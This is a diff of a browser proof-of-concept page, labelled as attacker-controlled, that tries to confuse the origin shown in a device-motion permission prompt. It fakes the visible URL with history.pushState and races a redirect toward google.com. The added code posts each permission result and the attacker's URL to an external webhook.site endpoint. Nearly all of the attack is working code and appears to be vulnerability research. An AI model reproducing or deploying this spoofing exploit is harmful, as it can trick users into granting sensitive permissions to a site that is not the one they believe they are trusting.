@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Location & Motion Origin Desync PoC</title>
+<title>Permission Origin Desync PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -10,16 +10,17 @@ body {
   margin: 0;
   font-family: -apple-system, BlinkMacSystemFont, system-ui;
   background: #f5f5f7;
+  text-align: center;
 }
 
 button {
   font-size: 15px;
-  padding: 10px 14px;
-  border-radius: 10px;
+  padding: 12px 16px;
+  border-radius: 12px;
   border: none;
   background: #007aff;
   color: #fff;
-  margin: 6px;
+  margin: 8px;
 }
 
 #panel {
@@ -30,7 +31,6 @@ button {
   padding: 24px;
   border-radius: 16px;
   box-shadow: 0 20px 60px rgba(0,0,0,.2);
-  text-align: center;
 }
 
 .notice {
@@ -43,55 +43,83 @@ button {
 
 <body>
 
-<div style="text-align:center; margin-top:60px;">
-  <button id="trigger">Start PoC</button>
-</div>
+<h2 style="margin-top:60px;">Permission Origin Confusion PoC</h2>
+<p>Attacker-controlled page</p>
+
+<button id="start">Start PoC</button>
 
 <div id="panel">
-  <h2>Request Sensitive Permissions</h2>
-  <p>Tap a button and observe the origin shown in the permission dialog.</p>
+  <h3>Request Sensitive Permission</h3>
+  <p>Observe the origin shown in the permission dialog.</p>
 
   <button onclick="reqMotion()">🧭 Enable Motion</button>
 
   <p id="output">Result: -</p>
 
   <div class="notice">
-    Demo only — origin in permission UI may not match user-visible origin
+    Demo only — permission UI origin may not match JS origin
   </div>
 </div>
 
 <script>
-const panel  = document.getElementById('panel');
+/* ================= CONFIG ================= */
+
+const WEBHOOK = 'https://webhook.site/a132a5ec-337f-46d5-958f-f8a8f9376120';
+
 const output = document.getElementById('output');
+const panel  = document.getElementById('panel');
 
-/* ================= PERMISSIONS ================= */
+/* ================= WEBHOOK PROOF ================= */
 
+function pingWebhook(status) {
+  fetch(WEBHOOK, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      poc: 'permission-origin-desync',
+      permission: 'motion',
+      status: status,
+      attacker_origin: location.origin,
+      attacker_url: location.href,
+      timestamp: Date.now()
+    })
+  }).catch(() => {});
+}
+
+/* ================= PERMISSION ================= */
 
 function reqMotion() {
   if (typeof DeviceMotionEvent?.requestPermission === 'function') {
     DeviceMotionEvent.requestPermission()
-      .then(res => output.textContent = 'Motion: ' + res)
-      .catch(() => output.textContent = 'Motion denied');
+      .then(res => {
+        output.textContent = 'Motion: ' + res;
+        pingWebhook(res);
+      })
+      .catch(() => {
+        output.textContent = 'Motion denied';
+        pingWebhook('error');
+      });
   } else {
-    output.textContent = 'Motion permission API not supported';
+    output.textContent = 'Motion API not supported';
+    pingWebhook('unsupported');
   }
 }
 
-/* ================= ORIGIN DESYNC LOGIC ================= */
+/* ================= ATTACK LOGIC ================= */
 
-/* Step 1: manipulate visible URL */
-document.getElementById('trigger').onclick = () => {
-  history.pushState({}, '', '/trusted');
+/* Step 1: Manipulate visible URL */
+document.getElementById('start').onclick = () => {
+  history.pushState({}, '', '/trusted/login');
   panel.style.display = 'block';
 };
 
-/* Step 2: navigation race */
+/* Step 2: Navigation race toward victim origin */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
         location.href = 'https://google.com:9090';
-      }, 80);
+      }, 100);
     });
   });
 });
@@ -99,5 +127,3 @@ window.addEventListener('pageshow', () => {
 
 </body>
 </html>
-
-
